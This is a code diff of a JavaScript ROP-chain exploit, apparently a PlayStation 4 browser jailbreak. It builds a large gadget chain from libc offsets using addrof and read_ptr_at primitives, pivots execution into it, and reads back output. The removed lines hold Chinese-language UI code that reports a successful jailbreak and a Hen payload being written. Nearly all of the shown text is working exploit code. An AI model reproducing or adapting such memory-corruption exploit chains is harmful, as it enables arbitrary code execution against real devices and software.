@@ -1,4 +1,3 @@
-var jailbreak = async function(){
 var ropchain_array = new Uint32Array(95852);
 var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
 var ropchain_offset = 2;
@@ -18,7 +17,7 @@ function db(data)
         ropchain_array[ropchain_offset++] = data[i];
 }
 var main_ret = malloc(8);
-var printf_buf = null;
+var printf_buf = malloc(65536);
 var __swbuf_addr = 0;
 ropchain_offset = 2;
 set_gadgets([
@@ -28,6 +27,7 @@ db([8, 0]);
 set_gadgets([
 libc_base+248252,libc_base+788575,ropchain+112,libc_base+471355,libc_base+811575,ropchain+309072,libc_base+811575,ropchain+65680
 ]);
+var printf_buf_offset = 128;
 ropchain_offset = 32;
 set_gadget(printf_buf);
 db([4294967295, 4294967295]);
@@ -22976,59 +22976,10 @@ db([514, 0]);
 db([0, 0]);
 set_gadget(ropchain+381680,);
 db([2303219542, 1032669414, 10, 3000, 1594167040, 2336801630, 922683510, 1208514303, 67158471, 1213267968, 136594571, 63679, 2962049024, 22286000, 698, 2684700672, 4278190295, 3739376080, 2236112479, 1697019126, 621054792, 0, 138447688, 1212189512, 1209043784, 33604039, 1219297280, 12715207, 3791650816, 3284152821]);
-
-await pivot(ropchain);
+pivot(ropchain);
 var main_ret = read_ptr_at(main_ret);
-// var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
-// var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
+var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
+var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
 var _ = malloc_nogc.pop();
 var _ = malloc_nogc.pop();
 var _ = malloc_nogc.pop();
-
-delete _;
-delete printf_buf_end;
-delete printf_ans;
-delete printf_buf;
-delete ropchain_array;
-delete ropchain_offset;
-delete printf_buf_offset;
-delete __swbuf_addr;
-if ( main_ret == 0|| main_ret==81) {
-    //delete main_ret;
-    // await sleep(1000);
-
-	window.orbis.style.display='block';
-	window.titleONE.style.display='none';
-
-    window.msgs.innerText =  "破解成功 已加载。\n请等待 左上角 跳窗结束, 正在写入Hen";
-    fail_times = Number(localStorage.getItem("fail_times"))||0;
-    jb_times = Number(localStorage.getItem("jb_times"))||0;
-    fail_times-=1;
-    jb_times+=1;
-    localStorage.setItem("fail_times", fail_times);
-    localStorage.setItem("jb_times", jb_times);
-    document.getElementById("fail_times").innerHTML="失败次数: "+String(fail_times);
-    document.getElementById("jb_times").innerHTML="成功次数: "+String(jb_times);
-    sessionStorage.setItem("jb_done", 1);
-    window.ing.style.visibility='hidden';
-    window.timeC.style.visibility='hidden';
-    window.timeC.removeEventListener('animationend', jb_time);
-    window.timeC.style.animation='';
-    window.timeC.style.webkitanimation='';
-    
-   
-    
-}
-else {
-
-    window.msgs.innerText="error:"+ main_ret+"\n失败了！！先别动！！！\n 1. 等20秒\n 2. 长按退出键 关闭网页 \n 3. 长按PS 重启/关机";
-    //localStorage.setItem("fail_times", fail_times);
-    document.getElementById("fail_times").innerHTML="失败次数: "+String(fail_times);
-	// malloc_nogc = [];
-	    // await read_ptr_at(0);
-
-    delete ropchain;
-    delete leaker_obj;
-    delete leaker_arr;
-    delete oob_slave;
-    delete oob_master;}}
